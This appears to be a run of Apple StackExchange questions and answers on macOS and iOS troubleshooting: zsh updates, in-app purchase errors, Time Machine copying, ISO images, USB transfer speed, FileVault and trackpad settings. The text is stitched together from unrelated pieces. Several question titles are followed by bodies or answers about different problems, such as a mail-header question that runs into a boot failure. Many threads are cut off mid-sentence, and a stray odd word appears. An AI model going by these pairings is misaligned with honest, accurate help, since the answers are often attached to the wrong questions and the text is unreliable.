That page shows version 5.7.1 being current.\n➥ Is there some way to update to the current version of zsh?\n\nA: Not exactly. You can't (although that can be overridden) and should not update anything in /bin as that is controlled and updated by Apple.\nHowever you can install zsh from elsewhere and put it in another place and use that path to start it from Terminal.\nOne way is to download the source from here and compile it.\nHowever it is probably easier to install from a package manager like Macports or Homebrew both of which  will have compiled up the binary.\n", "Q: Restoring Chrome cookies I use Google Chrome as my browser.

I've successfully made purchases in the past, but not with these apps, and both times yesterday and today I've gotten an odd failure. I'm using an iPhone XS Max.\nHere's what I do:\n\n*\n\n*Click on remove adds in either app, which gives the \"Double click to pay\" dialogue.\n\n\n*Double click the side button\n\n\n*Face ID checks and gives a checkmark with \"Done\" below\n\n\n*Then I get this \n\n\n*Continue takes me to Settings, checks Face ID and shows my billing information with the CVV not filled in.\n\n\n*Input CVV and click Done, I get another Face ID check and get this\nBoth Cancel and Buy seem to do the same thing at this point, just drop me back to the Account Settings page.\nThat \"%%appleId%%\" seems super sketchy. I'm keeping an eye on my credit card and haven't seen any weird charges. If I manually follow the path from the first dialogue I get to the same \"Account Settings\" page and get the same dialogue with \"%%appleId%%\"\nOtherwise, this seems like it could be a bug. Can I do anything to get around this %%appleId%% error dialog where it won’t let me enter my password or make a purchase?\n*(removing ads for both Sudoku Master Edition and Wordscapes)\n\nA: I had this happen to me and what worked was intentionally failing the Touch ID (or face I think it doesnt matter) so it gives you the option to type in your apple id password\n\nA: I went to System Preferences > Face ID and Passcode (which required me to enter my device password) and turned off Face ID for the App Store. \nOnce I did that, I attempted to make an in app purchase and was again sent to verify my info, but this time was able to do this successfully after inputting my CVV. \nI then turned FaceID back on for the AppStore.\n\nA: This happened to me as well a few days ago. I fixed it by turning off the passcode to unlock the iPad (which required me to enter the apple id password) and turning off Face Time for App Store purchases. Then I turned passcode back on (which again required my apple id password). Then when I went to do an in-app purchase it failed, required verification, but this time it actually asked for a password rather than giving the \"%%appleId%%\" error. The in-app purchased completed. I then turned face time back on for App Store purchases and now face time works just great for in-app purchases, no errors or failed verifications anymore.\nAs a developer, this has got to be happening to more folks than just us. You'd think Apple would have maetris that would be showing a general drop in in app purchases, but not a corresponding drop to app purchases and they would track the problem down and fix it.\nThere are also anecdotal reports that you might have to fail your fingerprint / Face ID or disable / re-enable more than once to clear this error condition. On most, the first fix works, though.\n\nA: You can intentionally fail the FaceID or turn off FaceID for AppStore. Both answers are correct.\nBut you can also turn off FaceID and after the purchase set it up again. This will regenerate your tokens definitely preventing this to happen again.\n\nA: I ran into this issue trying to make an in-app purchase on Foreign Numbers and neither of the above solutions worked for me unfortunately.\nFor me, I was able to make an in-app purchase with no troubles after rebooting my iPhone XS Plus. The in-app purchase seemed to take a little longer to initialise, so maybe that was a good sign...?\nIn any case, this doesn't seem to be the fault of any developer, I believe it's on Apple's end.\n\nA: I turned off all Touch ID here (System Preferences > Touch ID & Passcode) and then it worked.  And then I turned the all back on.  \n", "Q: How to add custom header when composing mails?

So I booted in my main system on internal drive and used repair on that partition by sudo diskutil mountdisk force /dev/disk2 because partition didn't show up. That didn't help.

Any ideas how to fix this without erasing/restoring onanism?\n\nA: When you get a prohibitory sign when you attempt to boot, it means your Mac can't find any bootable media.\nThis is the EFI firmware searching for a device to boot from and not having any success.  It has nothing to do with the file system, so First Aid or even reinstalling will not fix the problem.\nThe most likely cause of this problem is a failing drive.

All seemed OK, but I recently tried sending an attachment (from the desktop) with an email and got this: \n\nNo matter how long I wait (and for a 114kb attachment how long should it be? ) it never resolves. \nThe only thing I have done that is a bit different is turning off iCloud (I don't want to entrust my documents to third party, and need my computer to work WITHOUT an internet connection now and then, sorry Apple) but I wasn't sure if that was the reason for this. A quick online search got me a rather unhelpful tech support thread. I am hoping there is some quick-and-dirty way to fix this bug.

Just wondering if there's any docking solution that provides the possibility to connect to 3 external displays to the MacBook Air 2018, or if we're hardware limited by the iGPU here.\n\nA: If you want a \"native\" display signal, the 2018 Retina MacBook Air is limited to 2 external monitors. \nHowever, you can use other types of displays such as a USB display to act as a third monitor. They are generally limited in resolution, update frequency, GPU performance, etc. - so do not expect to be able to play 3D games or use 4k resolution on such a display.\nIf you want higher performance for the third display, you can connect an eGPU to the MacBook Air which would enable you to use more monitors with higher performance. Such a setup is usually quite more costly than a USB display however.\n", "Q: On macOS, why is the output of log stream different to log show?

This is making it very hard to diagnose postfix issues on macOS.\n\nA: By default debug messages are not persisted on disk, but rather only stored in memory.\nTherefore you can have the situation where you can stream the debug log messages live using the \"log stream\" command, but when you later want to find it using \"log show\" it is not there simply because it is not logged to disk and has been erased from memory.\n", "Q: Can I use any hardware on MBP retina late 2012 on a MBP mid 2012 (non retina)?

I am puzzled what the file was since Chrome's own \"Clear Browsing Data...\" tool didn't show this, and I believe a user should be made aware if an app is going to fill up their disk!\nIn any case, my answer is simple: I decided to try restarting first, and that seemed to be sufficient, the file was gone afterwards.\n", "Q: Move iPad Screenshots to an album I have an iPad Pro, and I'm wondering if there is a way to auto save a screenshot from my iPad to an album name e.g.: iPad Pro\n\nIs there an automated way in iOS that I can do that for only my iPad? \n\nI found a way to do that in IFTTT but they detect any screenshot from all my iOS devices, even the one I took from my iPhone, and because of that it messed up the automation. \n\nPlease let me know if there is another way to do this in a fully automatic manner.\n\nA: As an alternative, one way to accomplish this is to use the Shortcuts app by Apple, available on the App Store for iOS devices.\nHere is the App Store Preview link for Shortcuts.\nAfter installing the Shortcuts app, do the following:\n\n\n*\n\n*Open: Shortcuts\n\n*Tap: Create Shortcut\n\n*Scroll down to Photos & Videos and tap: Get Latest Screenshots\n\n*Scroll back down to Photos & Videos and tap: Save to Photo Album\n\n*On the Save to Photo Album shortcut, tap Camera Roll and on the Album sheet select e.g.: iPad Pro\n\n*At the top of the Untitled Shortcut screen tap the Settings icon (the double switch).\n\n\nFrom here, you can give it a name and set the various controls, tapping Done when finished.\nThe following is an image of the sample shortcut I created which, as initially set up, saves the latest screenshot to the e.g. iPad Pro album.\n\nThe following image shows the result of running the shortcut pictured in the image above, and as you can see the last screenshot was of the shortcut I created.\n\nObviously the screenshots were taken on my iPhone and are for demonstration purposes only, you'd install the Snapshots app on your iPad and use it there. You can also install and use it on your iPhone but its independent of your iPad install and not directly linked.\n", "Q: How can I script the keyboard backlight settings? I'm looking to change settings with a script, but I can't find where the plist data for the keyboard backlight settings is stored.\nFor example, in the System Preferences, I'd like to modify the preferences in the Keyboard section with a script. These ones:\n\nNormally how I find a setting is\n\n\n*\n\n*I run defaults read > before and defaults read -g > before-g\n\n*Then I change the setting in System Preferences\n\n*Then I run defaults read > after and defaults read -g > after-g\n\n*Then I compare the differences from the before files to the after files to see what changed.\n\n\nBut for some reason, this doesn't work with the keyboard backlight settings, and I see no difference from before files to after files when I've changed the keyboard backlight settings in between before/after.\nHow can I script the keyboard backlight settings?\n\nA: Short answer, TLDR: No, a simple script will not suffice for what you are trying to do. But ...\nYou will have better luck using a third party like this one: https://github.com/pirate/mac-keyboard-brightness. His code can take user input and manipulate the keyboard for you. But I am not sure if this was tested in Mojave but you are welcome to try. \nLong Answer, for the curious:\nCertain system settings or running hardware tasks on a Mac are initiated and ran with kernel extensions and continue to run with the kextd daemon. What drivers are for Windows are how kernel extensions are for Mac OS. Without kernel extensions your Mac OS would not boot properly. \nYou can safely test with your sound on your Mac using information about removing kexts here, but be sure to back up your files: http://osxdaily.com/2012/05/30/how-to-completely-disable-audio-sound-in-mac-os-x/\nTake a look the code written there by Pirate, in his code in keyboard-brightness.c he does a good job dissecting the Mac. You can see how a bit more complex your script would be if you tried to tackle this through code. A simple bash script would not suffice.\nIn Pirate's code you can see that he accesses the keyboard light with the Foundation framework and the IOKit framework, written in Objective C/C++. If you are comfortable with this language then you should try to dabble more with his code.\nWhy running defaults didn't catch anything?\nThe reason defaults doesn't show anything is because defaults is meant to edit plist files only. \nHow can I see my kernel extensions? You can see a full list of kernel extensions currently running in terminal with the following command:\nkextstat\n\nYou can also see a list of all your installed kernel extensions under:\n/System/Library/Extensions\n\nIn terminal you can see which keyboard kext file you have by running grep:\nkextstat | grep \"Keyboard\"\n\nI do not have a laptop, but I am safely assuming you will also have a keyboard kext file that will look similar to mine:\n\nWhere can I learn more about the IOFramework? https://developer.apple.com/documentation/iokit?language=objc. On Pirate's git page you can see he also wrote his code in swift4, which might be easier to understand. You can switch back and forth from ObjC and Swift language types on the Apple Developer Page.\nI hope this answer was useful to you.\n", "Q: How to get error status back to bash from osascript Inside a bash script, I'm closing the front window of whatever application is foreground.  I'd like to know if the command failed (when the foreground application doesn't have a front window.  I tried this, but even though the warning beep is heard indicating the cmd-W failed, the script always prints \"Command Succeeded\".  What's the easy way to detect that there's no front window?\n osascript -e 'tell application \"System Events\" to keystroke \"w\" \n    using {command down}'\n if [ $? -eq 0 ]  ; then\n     printf \"Command succeeded\\n\"\n else\n     printf \"command failed\\n\"\n fi\n\n\nA: As mentioned, the result of osascript is not the same as the result from the script.  What I do is use the -so option to also print errors on stdout, then use the exit code from osascript to determine how to treat the result:\nosascript -s o -e 'error number -128'\n\nwill error and also return an error message/number from the script - User canceled. (-128),  while\nosascript -s o -e 'tell application \"System Events\" to keystroke space'\n\nexits normally and won’t generate an error.\nYou need to be more specific when trying to generate errors, for example try to get the front window, which will generate an error if there isn’t one.\n\nA: Here is a bit of a different approach that does not use System Events.  The following AppleScript code will get the name of the front most application, then that application will check to see if it has any open windows.  If that application does have an open window, it will be closed.  Also, for example, if the front application has an unsaved document as window 1, and you want to be prompted to save that document, just remove the \"without saving\" part of the command. \nThis works for me using the latest version of macOS Mojave.\ndelay 5 -- GIVES TIME TO TEMPORARILY SET FOCUS ON ANY OPEN APP..

Many of them cite speeding up older devices as the primary reason.\n\nA: iOS 12 actually sped-up iOS devices all around! I highly recommend you upgrade.\nHowever, if you really don’t want to upgrade for personal reasons, you can install the tvOS provisioning profile for tvOS pre-releases on your iOS device. This should block iOS updates as your phone will be configured to fetch tvOS upgrades, but tvOS updates are not compatible with iOS devices.\n\nA: \nHow can I stop iOS from automatically downloading updates?\n\niOS/iPadOS 13.6 has introduced the ability for users to turn off automatic download of updates. To configure automatic download or installation of iOS/iPadOS updates on your iPhone or iPad, go to Settings app → General → Software Update → Customize Automatic Updates and toggle the switches as desired.\nThe linked Apple Support document discusses the same:\n\n*\n\n*https://support.apple.com/kb/HT204204\n\nCustomize Automatic Updates\n\nWith iOS 13.6, or iPadOS, you can choose not to download software updates automatically.

It will present you with a message stating that \"The update cannot be installed because it requires at least #### amount of availiable storage during installation.\"\nThis will then solve your problems.\nYour choice as to how you fill up the space. You may want to download a lot of Netflix movies to your device.\nFor me the quickest way may seem obsurd but it's the quickest.\nI set my iPad facing a window and simply just hit record and leave it for an hour or so. At least I get some nice wildlife shots as my window sits facing a park. This usually fills up the space and if I ever need space I simply go in to my gallery and delete the video. You can even do incremental videos so you only have to delete one for however much space you need rather than having a single file taking up the entire space on the device hard drive.\nThis may seem tedious but is the only way to get Apple of your back from forcing their stupid updates on its users.\n", "Q: Cydia - Add sources through command line I am able to SSH into my iPhone and update the file /var/mobile/Library/Caches/com.saurik.Cydia/sources.list with the number of repos, but the file gets reverted as soon as I try to update the repos through the Cydia app.\nIs there a way to download/update the Cydia sources through command link.

I just bought a Dell 38\" Ultrawide (D3818DW) and I wanna get all the cables I need while I wait for it to arrive.\nI want to use the KVM feature of this monitor between my MBP mid-2012 and my PC so I can switch seamlessly between them.\nI've read that I need a Mini-Display Port to Display Port cable to connect my MBP. And to use the KVM feature, I have to also connect a USB downstream cable to the MBP.\nHowever, I also read that connecting a MBP via USB-C can bypass having to connect a USB Downstream to use the KVM feature. My Mac has a Thunderbolt 2 port and two USB 3.0 ports.\nSo, can I just use something like the StarTech TBT3TBTADAP TB 3 to Legacy TB adapter for display and KVM? So I won't have to have two wires sticking out of my MBP when using the KVM feature.\n\nA: No, that product cannot be used for this purpose as it does not transfer the actual display signal (i.e. what would be called Alternate Mode in USB-C), nor is it for connecting newer TB3/USB-C devices to an older computer - it is actually for connecting old TB/TB2-devices to a new TB3 computer.\n\nA: \nSo, can I just use something like...a TB 3 to\n  Legacy TB adapter for display and KVM? So I won't have to have two\n  wires sticking out of my MBP when using the KVM feature.\n\nNo.  This cannot be done.  Thunderbolt 3 is backward compatible with Thunderbolt 2 and 1.  It cannot make a Thunderbolt 1 or 2 port suddenly Thunderbolt 3.\nThunderbolt is backward compatible not forward.  \n\nI also read that connecting a MBP via USB-C can bypass having to\n  connect a USB Downstream to use the KVM feature.\n\nThe industry has made USB-C very confusing. Basically, it's not if you have a USB-C port, it's if your computer supports USB v3.1 which uses a type C connector.  The USB ports on your existing Mac are 2.0, so it will not work as a single cable solution.  You'll need both the DisplayPort and USB downstream cable.\n", "Q: Can I run Yosemite after I install the Mojave firmware updates? I'm very hesitantly getting ready to \"upgrade\" from Yosemite to Mojave because I worry that it will break things I still need. So to give it a try I've decided to install Mojave on an external drive first.\nBefore I do that, I need to know if I can run my current Yosemite installation after I let the Mojave installer update the firmware. If I install Mojave on an external drive and suddenly can't boot my current Yosemite setup, I'll be hosed!\nCan anyone confirm the firmware updates won't break Yosemite?\n\nA: Yes, such a downgrade is possible.\nOnce shipped the firmware updates really change very little in terms of hardware capabilities. \nThose firmware updates in Mojave seem to be really mostly about adding support for APFS. Whether Appel included more substantial changes to existing hardware, like security fixes, are mostly unknown, due to the standard lack of transparency regarding update from Apple.\nThat means in personal testing I have never seen a device not booting the system it came with originally, despite numerous upgrades. The most extreme example being 10.13 on a MacBook Pro that shipped with 10.6.\nThe lack of problem reports for official Apple solutions (Apple: Use the Mac operating system that came with your Mac, or a compatible newer version) and other solutions (How to downgrade macOS from Mojave to an older version) indicate that the Mac itself should be able to run al those supported versions.\nCaveat: \nThat means it should be fine for an Apple computer and an Apple system software to mix and match as you desire. (Boot 10.9 one day, try out Mojave the other and then go back to Yosemite.) \nThat doesn't mean that a possible security fix in one of the firmware updates (eg for how Thunderbolt operates) might not break interoperability for one of your other third party hardware peripherals. But even for these possibilities a problem report seems hard to find.\n", "Q: IOS 12.1.4 - Apps bugged, can't delete or reinstall I recently changed to a temporary iPhone 6, while my main iPhone is being repaired.

If I delete them they just re-appear on restart. After they're deleted the appstore only gives me the 'open'-option, I cannot reinstall them (nothing happens when pressing 'open'.)\nI tried a hard reset, several restarts, and the apps both do not show up in Settings -> General -> Usage so I can't uninstall them from there.

There are multiple ways how we can connect an external display via USB-C to an Apple device (say MacBook Pro). For example:\n\n\n*\n\n*directly (e.g. LG UltraFine)\n\n*using Apple's USB-C to HDMI/VGA/DVI dongle\n\n*using a USB-C dock that supports DisplayLink\nThe last mentioned method - DisplayLink dock - is a 3rd party solution that does not seem to be supported by Apple and requires special drivers to be installed. Do other methods also require special drivers?\nIs using original Apple dongle or connecting a display directly better since it connects directly to GPU while DisplayLink needs to encode/compress the image? (I've noticed it uses substantial amount of CPU).\n\nA: \nIs using original Apple dongle or connecting a display directly better\n  since it connects directly to GPU while DisplayLink needs to\n  encode/compress the image? (I've noticed it uses substantial amount of\n  CPU).\n\nThe short answer to this is yes.  DisplayLink is the \"universal\" USB display adapter driver. Being that the adapters are USB devices, and not actual GPU's, it stands to reason it will use more CPU than the other methods.\nUSB-C\nThe industry and Apple have created a ton of confusion around USB-C, Thunderbolt, and DisplayPort.  So, let's clear some of it up....\n\n\n*\n\n*USB-C is just the connector type.  Technically, it's called a type C connector.\n\n*Thunderbolt 3 utilizes a type C connector and includes the following signaling:\n\n\n*\n\n*DisplayPort video \n\n*USB 3.1\n\n*Power Delivery\n\n*PCIe\n\n\n*A USB-C port is a type C port and includes only the following signaling:\n\n\n*\n\n*USB 3.1\n\n*Power Delivery\n\n*Optional DisplayPort (like on the MacBook without Thunderbolt Ports)\n\n\n\nSo, it is entirely possible to have what looks like a USB port be a Thunderbolt port that supplies video and on the other end of the spectrum, have that same looking port provide nothing but USB connectivity.  This, along with calling everything now \"USB-C\" leads to tons of confusion.\nUSB vs. DisplayPort\nThe first two methods, you described, connecting to the LG UltraFine or using Apples HDMI/VGA/DVI adapter both utilize the DisplayPort signaling embedded within the port to connect your GPU (integrated or dedicated) to your monitor.  It's a pure video signal.\nA USB dock (regardless if it uses a type A, B, or C connector) is a USB device, not a DisplayPort device (caveat:  unless noted that it actually passes the DP signal).  Consequently, a USB video device is \"created\" and driven by the CPU, not the GPU.  \n", "Q: Applescript - Automator - tomorrow keyboard shortcut I've been able to successfully create a keyboard shortcut from a \"quick action\" in Automator based on running AppleScript (inserts current system date).

Try this:\nset thedate to ((current date) + (days * 1)) as string\ntell application \"System Events\"\n    keystroke thedate\nend tell\n\nThe \"current date\" returns the time in seconds, so you have to add one day worth of seconds (86,400 seconds in a day, but I'm sure you knew that) to get tomorrow. Change the multiplier to get more days in the future or past by using a negative value for the multiplier. \nNote that not all days have 86400 seconds (DST change is +/- 3600, Leap seconds, etc…) so on some days it may be an hour off.\n", "Q: Can't copy files from one hard drive to another (same sizes) I have two external hard drives, both 2TB. I've been using one as a time machine drive and have filled up about half of it.

When I drag the Backups folder from the TM drive onto the destination drive, it partially copies everything over and then says the drive is full. Sure enough, I checked and it has somehow filled up all 2TB despite the source drive only having about 1TB of data. \nDoes anyone know why this is happening? Neither drive is encrypted and they are both using a Journaled file system.\n\nA: Time machine uses Unix hard links.

When I mount the new image file, it's read-only and I can't change it or add files.  \nWhat am I doing wrong?  Why can't I mount the image with write permissions?\n\nA: Let's assume you have a physical or virtual FAT32 or ExFAT formatted drive. You could mount the ISO file and then copy all the files to this drive. I would recommend using the Terminal application to do the copy. Using the Finder application may result in the creation of ._* files. Although these files can be removed by using dot_clean. \nTo create a legacy bootable ISO file, use the command given below.\nhdiutil makehybrid -o windows10.iso /Volumes/ESD-USB -no-emul-boot -boot-load-size 8 -eltorito-boot /Volumes/ESD-USB/boot/etfsboot.com\n\nIn this example, the name of the drive shown in the finder was ESD-USB. The -boot-load-size was set to 8 sectors, because the size of the etfsboot.com file was 4096 bytes and the sector size is 512 bytes. ( 8 * 512 = 4096 )\n\nA: You cannot modify ISO files using Disk Utility, nor using diskutil on the commandline.

I have one USB drive that I use to transfer files between my MacBook and a desktop PC with no Internet. Everything I try to do with this USB on my Mac takes a very long time - transferring a 1GB file can take twenty minutes, ejecting the drive properly can take ten, and dragging/dropping files, right clicking the drive, etc. often gives me the beach ball cursor.\nI never have this issue on my PC - transfer speed is very fast, which seems to rule out a problem with the USB itself. I'm wondering if this is more likely to be an issue with my computer or the adapter.\n\nA: I usually run Linux, but recently got a 2018 MacBook Air and ran into this problem. I have a directory of just over 100 MB in around 200 files that I frequently backup and move between computers using USB-A flash drives. Using USB 3.0 on Linux it transfers in a few seconds, and the drive ejects immediately, in all cases.\nWhen I first did this on my Mac, however, the same transfer was ridiculously slow (i.e. minutes) and I had trouble ejecting the drive, even when the computer was offline and nothing else was running. Every flash drive I tried did the same thing. Oddly, I also noticed that the flash drives seemed to work fine if they were already plugged in when I started or restarted the computer, but were slow when I plugged them in after the computer was booted up. There are a lot of other people online complaining about the same issues, so it's not just our particular computers.\nAfter some research, though, I think I've solved the problem. The speed and ejecting issues seem to be mainly the result of two things:\n\n*\n\n*The USB-A to C adapter you use. Make sure you get a USB 3.0 compatible adapter or hub (blue inside). I originally bought the Apple adapter, which is 2.0, and it took something like ten times longer to transfer that 100MB than with the 3.0 adapters I got later. (I don't understand why Apple wouldn't be selling a 3.0 adapter at this point.)\n\n\n*The Spotlighting feature in MacOS. I think this is the big culprit. Watching the Activity Monitor, it's clear a LOT of resources get eaten up trying to index the files on the flash when you do a large transfer, even after the files are all copied, and the drive won't eject until it's finished. The transfers are a LOT faster and the drive ejects right away if you turn off Spotlighting for the flash drive. Just go to: System Preferences -> Spotlight -> Privacy, and click + to add the drive to the opt-out list. (The drive will disappear from this list when you eject it, but the system remembers it by name and it will reappear there as an opt-out when you mount it again, so you only have to do this once for each flash drive. You might want to give each of your drives a unique name to track this.)\nBy using a 3.0 adapter and turning off Spotlighting, I'm now getting flash transfers that are more like the speeds I'd expect, and I'm not having problems ejecting the drive. (With Spotlighting on, starting or restarting the Mac with the drive plugged in seems to give the proper performance, as well, which probably means the indexing is taken care of during boot-up initialization.)\nGood luck!\nUPDATE: I also tried reformatting my flash drives to APFS format, and it sped up transfers even more - quite a bit more on larger drives.  If you don't need to use non-Apple systems, it's probably worth changing them over to the new Apple file format.

Any other ideas on how to do this so it stops sideways scrolling? Otherwise, a good replacement mouse for graphics/photography work.\n\nA: I've looked this up a dozen times over the last year, but just after posting found a solution that evaded me previously.

Is there a technical reason? Once it is started you have to wait for days and it is extremely annoying.\n\nA: It is not impossible in theory to create a \"Cancel\" button for FileVault.\nTechnically it is quite involved to create a \"Cancel\"-button. It is much more complex than for example creating a \"Cancel\"-button when you're copying a file. \nUsually \"Cancel\"-buttons gets the computer to stop doing what it is doing. These are generally fairly easy to create. In the case of FileVault, it is not enough for the computer to stop doing what it is doing - it also has to undo everything it has done during the encryption process. That can be very time consuming and would need to be able to \"survive\" shutdowns of the computer.\nAs to why it was decided not to dedicate resources to creating the \"Cancel\"-button, there can be only speculation, as there's no official statement from Apple on the matter (which is not surprising).\n\nA: Technically there are three reasons to not do this:\n\n\n*\n\n*Encryption and decryption goes block by block and changes the data so you would have to program in code to halt that, then implement a partial reverse and go un-do the portion of the work that was already done.\n\n*Everything you code, you have to test and the only code that has no bugs is the line of code you don't write.\n\n*The social cost of adding complexity means documentation is longer, support is longer, troubleshooting is longer.\n\n\nThe alternative is just wipe your system, reinstall and restore from backup. For a pro, that takes maybe 15 minutes of time - plus some short waits since pros have installers cached or fast internet and can multitask. For a first time wipe and restore, you might take two hours max, plus waiting for the restore. If you're going to save days of wait and have a 2 hour to 20 minute fix, I'd say just abort the conversion is the winning move for anyone waiting days.\n", "Q: iOS custom keyboard clicks sound Is there a way to customise the sound of the keyboard click that can be turned on / off under:\nSettings > Sounds > Keyboard Clicks\n\nA: Simple answer: No. You're stuck with the sounds in the interface Apple provides, which have default settings for ringtone, text tone, new voicemail, new mail, sent mail, calendar alerts, reminder alerts and airdrop.\nYou can customize entries in Contacts to use alternate sounds and ringtones for texts and calls, but that's it.\nIt may be possible to change the click sound if you jailbreak your iPhone, but I'm just guessing.\n", "Q: How do I unhide columns in Numbers using AppleScript?

I have a PC running Windows 10 at work, that is about 8 years old, and a Windows laptop that is about 6 months old.\nI wish to use my desktop to communicate with people with images from the PC or texting, so that my workflow could involve not picking up the iPhone constantly.\nI was considering getting an iPad Pro 2017 and plug it up to the PC, then display the image as a window on my Windows 10 PC.

I have read articles about getting a Mac mini and use remote desktop from Google Chrome to do that, or run macOS in a virtual machine on windows. My Windows 10 PC is too old and limited to only 8 GB of memory.\n\nA: iMessage which was subsequently rebranded as Messages is a messaging service available for Apple devices.\nIt is not available for other desktop and mobile operating systems. It is not possible to use iMessage on Windows by installing any app or Web based client.\n\nI was considering getting an iPad Pro 2017 and plug it up to the PC, then display the image as a window on my Windows 10 PC.

As long as you are able to run and access macOS, you should be able to access iMessage service all right.\nIf the only thing you are looking for is to look for an easy way to exchange iMessage (from the comfort of using physical keyboard) using it on a Mac is your best bet.

When I Ctrl-click the Folder and choose Folder Action Setup, it gives me a list of scripts, none of which do what I want, so I assume I have to write this script in Automator?\nUsing Automator, I start with the \"Files and Folders\" --> Get Selected Finder Items as my first step.  Then I tried \"Files and Folders\" --> Rename Finder Items, but this seems to be only about adding a date to the existing name.\nI see I can use Automator -> \"Ask for Text' to display a dialog to the user, but then how do I use that input to rename the file?\n\nA: After much hunting, I found Get Selected Finder Items and then Rename Finder Items: Name Single Item.  One nuance is that renaming the file ends up recursively calling the script, because the file with the different name is perceived as a new file.  I got around this by having a 'staging' folder, then the ultimate destination folder, and used Mover Finder Items as the last step in my Automator sequence.\n", "Q: How to buy English books in iOS Books app from Spain?

A simple reboot or shutdown, power on did not clear it up, but powering off the Mac and unplugging it for ten minutes then powering it back up.\n", "Q: How do I turn off/disable my trackpad on a MacBook Air? I am on a mission to become proficient with keyboard shortcuts, and I keep cheating by accident and using my trackpad. I want to be rigorous in my attempt to learn, so how do you toggle the trackpad on and off?\nI found information on how to turn it off if you use a mouse, but that defeats the purpose of what I am trying to do. \nIn the spirit of learning keyboard shortcuts, if anyone knows how to set a keyboard shortcut to toggle the trackpad, that would be optimal.\n\nA: Actually, it is possible to disable the trackpad without needing to connect a mouse or wireless trackpad by using the Mouse Keys feature, but this will block your ability to enter text while it’s on.  Mouse Keys allows you to use certain keyboard keys to control the movement of the cursor.  While this answers your question, it won't allow you to do what you need.\nThis can be accessed in System Preferences / Accessibility / Pointer Control (or Mouse & Trackpad on older OSs) / Alternate Control Methods, and then check Enable Mouse Keys after you’ve enabled the 2 checkboxes in the Options window:\n\n*\n\n*Press the Option key five times to toggle Mouse Keys\n\n*Ignore built-in trackpad when Mouse Keys is on\n\nThe first setting will allow this key command to turn the feature on/off so you can quickly access the trackpad again when needed.\nThis Apple support article explains how to use the feature and includes other ways to disable/enable it:\nhttps://support.apple.com/guide/mac-help/control-the-pointer-using-mouse-keys-mh27469/10.15/mac/10.15\n\nA: To turn off the track pad you’ll need to attach a mouse or wireless trackpad but you don’t need to use it. \nTo turn off the trackpad when a mouse is connected:\n\n\n*\n\n*From the  Apple menu go to System Preferences\n\n*Click Accessibility \n\n*Select Mouse and Trackpad on the left \n\n*Select “Ignore built-in trackpad when mouse or wireless trackpad is present”\n\n", "Q: Macbook Pro 2012 MD101 cannot bootup, cannot reinstall OSX Problem Description\nAbout 5 years ago, I upgraded the original HDD to SSD (Samsung 840 evo), everything was ok until last November.\nAfter a trip to an examination (4 hours drive, 2 hours out, 2 hours back), when I turn on the power there is a Question Folder mark display on the screen.\nBecause this one is a spare computer, and there is no important data, so I tried to reinstall OS X. But after a long wait, the computer still cannot boot up, still question folder mark.\nWhen I try to reinstall again,the SSD cannot be found in Install OS X Program or Disk Utility Program. I take off the SDD, connect it to a PC, and delete the partition, those Mac APPs can find it again, but Disk Utility Program cannot erase the disk, the erasing progress will be stuck on somewhere.\nI thought this SSD is dead. So I replaced it with a new SSD. Try again, the same problem(After download files, reboot to continue to install will display Question Folder mark).\nIn addition to these:\nI tried to reinstall from Recovery Disk. Still, the same problem.\nI tried run Apple Hardware Test, did not find any problem.\nAfter a lot of tries, when I erase the partition, this error popup:\n\nVolume Erase failed\nVolume Erase failed with the error:\nPOSIX reports: The operation couldn't be completed.\nInput/output error\n\nConjecture\nWhen I drive to then examination perhaps some bumps and shakes broke some part in the computer? I don't know.\nIt seems like the Part of SATA I/O or something on logic board goes wrong?\nUpdate\nI installed macOS to an external drive, it workes. I tried several times, and I found maybe the problem is the cable. I order a new cable online, I will try again later.\nUpdate 2\nAfter replacing the cable, problem fixed. :)\n\nA: It sounds like you had a replacement SSD that WAS working at one time and has since failed. You then had some work done on the Mac or had some diagnostics done (?) but with no results.\nTrying another SSD yielded similar results: the drive was not found to install macOS onto.\nI am re-stating your problem to make sure I got it right.\nWhat it SOUNDS like is that there is something going on with the storage subsystem. A cable, a connector or something on the system board (disk controller or the like).\nYou could examine all the connections carefully make sure there are no kinks or breaks in any cables associated with the disks. And if you still have the original working drive I would be tempted to try that, assuming it is still around and still bootable.\nFailing all of that I would say that the issue is with the Mac itself and if a repair shop can't fix it what you have is an expensive door stop, unless you want to use the Mac with an external drive plugged into it (assuming that works...)\n\nA: Not clear what your problem might be, possibly logic board. \nIn the boot up sequence the SMC the NVRAM and T2 (which are separate chips on logic board)  and play a role in the initial start up.\nEFI is a part of the disk.\n", "Q: PSA: Random freezes/kernel panic on 2013-2015 retina MBP I've got a Late 2013 15\" MBP (A1398) that has been experiencing random freezes/kernel panics for a while now. I was initially unable to pinpoint a cause.\n\nA: After a while tinkering and the sudden realization the panics were precipitated by moving the laptop; I realized there is a small screw right underneath the SSD. With time, vibration and possibly hits/falls, the screw can come loose.\nThe problem with this is the screw's head can make contact on some of the SSD components effectively shorting them out. AFAICT, the shorts are benign and have no consequences other than a kernel panic.\nOf course, I wouldn't hold my breath nor bet on it not having the potential to leave permanent damage in the drive.\nSo... what's the point of the question? This issue can be easily solved by adding one or three strips of Kapton tape (or similar) in order to insulate the screw head from the SSD; as seen here:\n\n\nThis happened to me on the aforementioned model but I wouldn't be surprised if this problem is common to all MBP models sharing this design.\n", "Q: How do I enter < and > on a broken keyboard? As per title: I've a broken keyboard where the < and > keys don't work anymore. Can I insert such symbols with a Option + X  combination?\nI would prefer to avoid direct ASCII code numbers, if possible.\n\nA: macOS doesn't do 'alt-codes', that's a Windows feature.*  \nSimplest solution might be to use the Keyboard Viewer, accessible from the Menu Bar once enabled in: System Preferences > Keyboard > Keyboard \nOn a UK keyboard they're accessed by pressing  Shift ⇧  \n\n*From comments:\nThey can be made to work, though I feel they're more effort than really needed ;)\nSystem Preferences > Keyboard > Input Sources > Plus sign > Unicode Hex input. After you choose it, you can do Option then 003C, it'll show the < symbol.\n\nA: You can remap those characters to the option keys using Ukelele.\nYou could also set up keyboard shortcuts for them via: System Preferences > Keyboard > Text > Replace  With\n", "Q: Tracing PHP process killed on Mac does not work I'm running a simple PHP process that uses a tiny bit of memory and CPU. The max memory limit is 2G and the script is run from console.\nThe memory used never exceeds 200 MB. CPU use fluctuates between 10 - 80% of a single core.\nAt random, the process will be killed with message Killed: 9. There is nothing else given in the error message in the console and nothing appears in the logs.\nThis even happens if I pause the script using XDebug so that no additional memory can be used.\nThis happens if I disable Xdebug as well, so I don't suspect that is the culprit.\nI've tried rebooting, but still happens.\nThe PHP script simply pulls a list of ads from Facebook using their PHP SDK v3.2 and then adds them to a database. There is only one worker running. Very simple process.\nI have 32 GB RAM and 1TB HD. Running PHP 7.2 with nginx, MySQL 5.7 and redis.\nMy 